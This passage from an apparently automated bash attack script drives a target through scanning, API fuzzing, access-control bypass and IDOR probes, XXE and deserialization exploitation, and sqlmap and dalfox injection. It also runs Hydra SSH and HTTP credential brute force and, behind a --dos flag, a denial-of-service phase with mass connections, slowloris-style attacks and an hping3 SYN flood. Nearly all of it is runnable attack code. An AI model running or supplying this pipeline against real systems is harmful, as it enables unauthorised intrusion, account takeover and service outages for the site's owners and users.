run nmap nmap -sV -sC "$NMAP_PRIV" --script "vuln,vulners,ssl-enum-ciphers,ssh-auth-methods,ssh2-enum-algos,http-headers,http-methods,http-security-headers,http-enum,http-slowloris-check,smb-vuln-ms17-010" -p "$OPEN_PORTS" -Pn "$NMAP_TIMING" --host-timeout "$((DURATION * 10))s" --script-timeout "$((DURATION * 2))s" -oN "$OUTDIR/raw/nmap.log" "$HOST"

if [ "$SCHEME" = https ] || printf '%s' "$OPEN_PORTS" | grep -qw 443; then
    run testssl testssl --quiet --color 0 --severity LOW "$HOST:$PORT"
    run sslscan sslscan --no-colour "$HOST:$PORT"
fi

## ================================================================ PHASE 3: enumeration
phase "Content & API Enumeration"
reauth_check
run gobuster gobuster dir -u "$BASEURL" -w "$WORDLIST" "${CURL_AUTH[@]}" -q -t "$THREADS" -k -x php,html,txt,json,bak,old,zip,sql -o "$OUTDIR/raw/gobuster.log"
run ffuf ffuf -u "${SCHEME}://${HOST}:${PORT}/FUZZ" -w "$WORDLIST" "${FFUF_AUTH[@]}" -mc 200,204,301,302,307,401,403,405,500 -ac -t "$THREADS" -rate "$FFUF_RATE" "${FFUF_DELAY[@]}" -s -o "$OUTDIR/raw/ffuf.json" -of json

API_WL="$SL/Discovery/Web-Content/api/api-endpoints.txt"
if have ffuf && [ -f "$API_WL" ]; then
    run ffuf-api sh -c "ffuf -u '${SCHEME}://${HOST}:${PORT}/FUZZ' -w '$API_WL' ${FFUF_AUTH[*]} $FFUF_EXTRA -ac -mc 200,201,204,400,401,403,405,500 -t $THREADS -s -o '$OUTDIR/raw/ffuf-api-root.json' -of json; ffuf -u '${SCHEME}://${HOST}:${PORT}/api/FUZZ' -w '$API_WL' ${FFUF_AUTH[*]} $FFUF_EXTRA -ac -mc 200,201,204,400,401,403,405,500 -t $THREADS -s -o '$OUTDIR/raw/ffuf-api-sub.json' -of json"
fi

if have kr; then
    # Use Assetnote wordlists directly if local .kite files are missing
    run kr-scan kr scan "$BASEURL" "${CURL_AUTH[@]/#--header/-H}" -A=apiroutes-210228:20000 -j 10 --fail-status-codes 401,404,403,501,502,503 -o json > "$OUTDIR/raw/kr-scan.json" 2>&1
fi

if have arjun; then
    run arjun sh -c "arjun -u '$BASEURL' -oT /dev/stdout -q 2>/dev/null; [ -s '$API_URLS' ] && arjun -i '$API_URLS' -oT /dev/stdout -q 2>/dev/null" > "$OUTDIR/raw/arjun.log" 2>&1
fi
run nikto nikto -host "$HOST" -port "$PORT" $([ "$SCHEME" = https ] && echo -ssl) -maxtime "${DURATION}s" -ask no -o "$OUTDIR/raw/nikto.txt"

# HTTP method map for discovered API/OpenAPI endpoints (verb sweep + OPTIONS Allow)
METHOD_SRC="$OUTDIR/raw/method-src.txt"
{ [ -s "$API_URLS" ] && cat "$API_URLS"; [ -s "$OUTDIR/raw/openapi-endpoints.txt" ] && cat "$OUTDIR/raw/openapi-endpoints.txt"; } | sort -u > "$METHOD_SRC" 2>/dev/null || true
[ -s "$METHOD_SRC" ] && run method-probe method_probe "$METHOD_SRC"

# 401/403 access-control bypass attempts (header + path tricks) over discovered endpoints
BYPASS_SRC="$OUTDIR/raw/bypass-src.txt"
{ [ -s "$METHOD_SRC" ] && cat "$METHOD_SRC"; echo "$BASEURL"; \
  [ -s "$OUTDIR/urls.txt" ] && cat "$OUTDIR/urls.txt"; \
  [ -f "$OUTDIR/raw/gobuster.log" ] && grep -oE "https?://[^ ]+" "$OUTDIR/raw/gobuster.log"; } \
  | sort -u > "$BYPASS_SRC" 2>/dev/null || true
[ -s "$BYPASS_SRC" ] && run bypass bypass_probe "$BYPASS_SRC"

# API authorization (IDOR/BOLA/BFLA/mass-assign) over API + numeric-id endpoints
AUTHZ_SRC="$OUTDIR/raw/authz-src.txt"
{ [ -s "$METHOD_SRC" ] && cat "$METHOD_SRC"; \
  grep -E '/[0-9]+(/|$|\?)|[?&][A-Za-z_]*id=[0-9]+' "$OUTDIR/urls.txt" 2>/dev/null; } \
  | sort -u > "$AUTHZ_SRC" 2>/dev/null || true
[ -s "$AUTHZ_SRC" ] && run authz authz_probe "$AUTHZ_SRC"

# JWT discovery + analysis
run jwt jwt_probe

# Rate-limit detection (bursts -> skipped in stealth). HTTP request smuggling if tool present.
[ "$STEALTH" = 1 ] && log "${C_D}rate-limit probe skipped (stealth: burst is anti-stealth)${C_0}" || run ratelimit ratelimit_probe
have smuggler && run smuggler smuggler -u "$BASEURL" -q
# WebSocket endpoint discovery + message-level fuzzing
run websocket websocket_probe
run websocket-fuzz websocket_fuzz

## ================================================================ PHASE 4: vuln scan
phase "Vulnerability & Fuzzing"
reauth_check
CORPUS="$OUTDIR/raw/corpus.txt"
# Aggregate ALL discovered URLs into the corpus
{ [ -s "$OUTDIR/urls.txt" ] && cat "$OUTDIR/urls.txt"; 
  echo "$BASEURL";
  [ -f "$OUTDIR/raw/gobuster.log" ] && grep -oE "https?://[^ ]+" "$OUTDIR/raw/gobuster.log";
  [ -f "$OUTDIR/raw/ffuf.json" ] && grep -oE '"url":"https?://[^"]+"' "$OUTDIR/raw/ffuf.json" | cut -d'"' -f4;
  [ -f "$OUTDIR/raw/ffuf-api-root.json" ] && grep -oE '"url":"https?://[^"]+"' "$OUTDIR/raw/ffuf-api-root.json" | cut -d'"' -f4;
  [ -f "$OUTDIR/raw/ffuf-api-sub.json" ] && grep -oE '"url":"https?://[^"]+"' "$OUTDIR/raw/ffuf-api-sub.json" | cut -d'"' -f4;
  [ -f "$OUTDIR/raw/kr-scan.json" ] && grep -oE '"url":"https?://[^"]+"' "$OUTDIR/raw/kr-scan.json" | cut -d'"' -f4;
  [ -s "$OUTDIR/raw/openapi-endpoints.txt" ]   && cat "$OUTDIR/raw/openapi-endpoints.txt";
  [ -s "$OUTDIR/raw/api-endpoints-extra.txt" ] && cat "$OUTDIR/raw/api-endpoints-extra.txt";
} | sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' | tr -d '\r' | grep -aE '^https?://[^[:cntrl:] ]+$' | sort -u > "$CORPUS"

NCORPUS=$(wc -l < "$CORPUS")
log "scan corpus: $NCORPUS URLs"

# isolate likely backend/API endpoints for the break-it phases
API_URLS="$OUTDIR/raw/api-urls-new.txt"
grep -iE '/api/|/v[0-9]+/|/graphql|/rest/|/rpc|\.json($|\?)|/oauth|/token|\?' \
    "$CORPUS" 2>/dev/null | sort -u > "$API_URLS" || true

# parameterized URL set for all fuzzers
PARAMS="$OUTDIR/raw/param-urls.txt"
{ grep '?' "$CORPUS" 2>/dev/null; [ -s "$API_URLS" ] && grep '?' "$API_URLS" 2>/dev/null; [ -s "$OUTDIR/raw/arjun.log" ] && grep -hE '^https?://' "$OUTDIR/raw/arjun.log"; } | sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' | tr -d '\r' | grep -aE '^https?://[^[:cntrl:] ]+$' | sort -u > "$PARAMS" || true
log "fuzz set: $(wc -l < "$PARAMS" 2>/dev/null || echo 0) URLs"

# Fast, high-confidence verified checks run FIRST (before slow template/DAST tools)
run inject-verify inject_verify "$PARAMS"
run openredirect openredirect_probe "$PARAMS"
# active XXE against API endpoints that may parse XML bodies
run xxe xxe_probe "$API_URLS"
# insecure deserialization (Java/PHP/.NET/pickle/Marshal) + gadget-chain exploitation
run deser deser_probe "$PARAMS"
run deser-exploit exploit_deser

# 500-provocation is intrusive (can degrade/crash the target) -> gated behind --dos.
if [ "$DOS" != 1 ]; then
    log "${C_D}500-provocation skipped (break-500 + deep fault injection) - enable with --dos${C_0}"
else
    NAUGHTY="$SL/Fuzzing/big-list-of-naughty-strings.txt"
    if have ffuf && [ -f "$NAUGHTY" ]; then
        BREAK_TARGETS="$OUTDIR/raw/break-targets.txt"
        { [ -s "$PARAMS" ] && sed -E 's/=[^&]*$/=SFUZZ/' "$PARAMS" | grep 'SFUZZ'; [ -s "$API_URLS" ] && sed 's/$/?api_fuzz=SFUZZ/' "$API_URLS"; } | sort -u > "$BREAK_TARGETS"
        [ -s "$BREAK_TARGETS" ] && run break-500 sh -c "while read -r u; do ffuf -u \"\$u\" -w '$NAUGHTY:SFUZZ' ${FFUF_AUTH[*]} -mc 500,502,503,400,405,406,413,414,431 $BREAK_FFUF -s -o /dev/stdout -of csv 2>/dev/null; done < '$BREAK_TARGETS'"
    fi
    # Deep 5xx provocation: malformed bodies, type confusion, verb tampering, oversized input.
    run break-500-deep provoke500 "$API_URLS" "$PARAMS"
    # HTTP request smuggling (raw-socket timing; can desync front/back proxies)
    run smuggle-native smuggle_native
fi
if have nuclei; then
    run nuclei nuclei -u "$BASEURL" -l "$CORPUS" "${NUCLEI_AUTH[@]}" "${NUCLEI_OOB[@]}" -rl "$NUCLEI_RL" -severity info,low,medium,high,critical -stats -silent -o "$OUTDIR/raw/nuclei.txt"
    [ -s "$PARAMS" ] && run nuclei-dast nuclei -l "$PARAMS" "${NUCLEI_AUTH[@]}" "${NUCLEI_OOB[@]}" -rl "$NUCLEI_RL" -dast -fuzz-aggression high -stats -silent -o "$OUTDIR/raw/nuclei-dast.txt"
fi
[ -s "$PARAMS" ] && { run dalfox dalfox file "$PARAMS" ${CURL_AUTH[*]/#-b/--cookie} ${CURL_AUTH[*]/#-H/--header} "${DALFOX_TUNE[@]}" --silence --no-color --skip-mining-dom -o "$OUTDIR/raw/dalfox.txt"; run sqlmap sqlmap -m "$PARAMS" "${SQLMAP_AUTH[@]}" "${SQLMAP_TUNE[@]}" --batch --level 3 --risk 2 --smart --crawl 0 --output-dir "$OUTDIR/raw/sqlmap"; }

## ================================================================ PHASE 5: brute
phase "Credential Brute Force"
if [ "$STEALTH" = 1 ]; then
    log "${C_D}credential brute skipped (stealth: brute-force is unmistakable noise)${C_0}"
else
    USERS="$SL/Usernames/top-usernames-shortlist.txt"; PASSW="$SL/Passwords/Common-Credentials/best110.txt"
    if have hydra && [ -f "$USERS" ] && [ -f "$PASSW" ]; then
        printf '%s' "$OPEN_PORTS" | grep -qw 22 && run hydra-ssh hydra -L "$USERS" -P "$PASSW" -t 4 -f -I -o "$OUTDIR/raw/hydra-ssh.log" ssh://"$HOST"
        run hydra-http hydra -L "$USERS" -P "$PASSW" -t 4 -f -I -o "$OUTDIR/raw/hydra-http.log" "http-get://$HOST:$PORT$PATHQ"
    fi
fi

## ================================================================ PHASE 6: stress
phase "STRESS / DoS Testing"
if [ "$DOS" != 1 ]; then
    log "${C_D}DoS/stress phase skipped - enable explicitly with --dos${C_0}"
else
    ulimit -n 200000 2>/dev/null || true
    run wrk wrk -t4 -c100000 -d"${DURATION}s" --latency "$BASEURL"
    if have slowhttptest; then
        run slow-headers slowhttptest -H -c 65539 -l "$DURATION" -i 10 -r 500 -u "$BASEURL"
        run slow-body    slowhttptest -B -c 65539 -l "$DURATION" -i 10 -r 500 -u "$BASEURL"
        run slow-range   slowhttptest -R -c 65539 -l "$DURATION" -i 10 -r 500 -u "$BASEURL"
        run slow-read    slowhttptest -X -c 65539 -l "$DURATION" -k 3  -r 500 -u "$BASEURL"
    fi
    have hping3 && { [ "$(id -u)" = 0 ] || sudo -n true 2>/dev/null; } && { log "RUN hping3 SYN flood"; timeout "$DURATION" sudo hping3 -S -p "$PORT" --flood "$HOST" >"$OUTDIR/raw/hping3.log" 2>&1; log "done hping3"; }
fi

## ================================================================ REPORT
info "Building final report..."
build_report
log "${C_G}DONE${C_0} -> $REPORT"
[ "${MAX_TIME:-0}" -gt 0 ] 2>/dev/null && kill "$WATCHDOG" 2>/dev/null
echo -e "\n  report: ${C_W}$REPORT${C_0}\n  json  : ${C_W}$OUTDIR/findings.json${C_0}\n  raw   : ${C_D}$OUTDIR/raw/${C_0}\n"
